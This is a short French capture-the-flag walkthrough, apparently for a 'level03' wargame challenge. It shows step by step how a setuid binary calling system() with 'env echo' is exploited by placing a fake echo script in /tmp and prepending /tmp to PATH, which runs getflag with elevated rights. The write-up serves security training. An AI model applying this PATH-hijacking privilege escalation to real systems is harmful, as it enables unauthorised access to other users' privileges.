Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

$ file level03
(Un binaire avec setuid setgid)

$ ./level03
Exploit me

$ strings level03 | grep "Exploit"
/usr/bin/env echo Exploit me
(On voit que echo est appelé pour l'affichage)

$ gdb level03
$ (gdb) disas main
0x080484fe <+90>:	call   0x80483b0 <system@plt>
(On voit que la fonction system est appelée, c'est surement elle qui appelle echo)
(On voit que oui avec un breakpoint)

$ echo "/bin/sh -c 'getflag'" > /tmp/echo
(on cree un faux echo qui va executer en fait "getflag" dans /tmp)

$ ls -l /tmp/echo
-rw-rw-r-- 1 level03 level03 21 Nov 27 19:44 /tmp/echo
(On a eu les droits)

$ chmod 755 /tmp/echo

$ export PATH=/tmp:$PATH
(On ajoute /tmp dans le path)

$ ./level03
Check flag.Here is your token : XXXXXXXXXXXXXXXXXXX
(La fonction system a execute notre faux echo avec les droits de flag03 a cause du setuid)
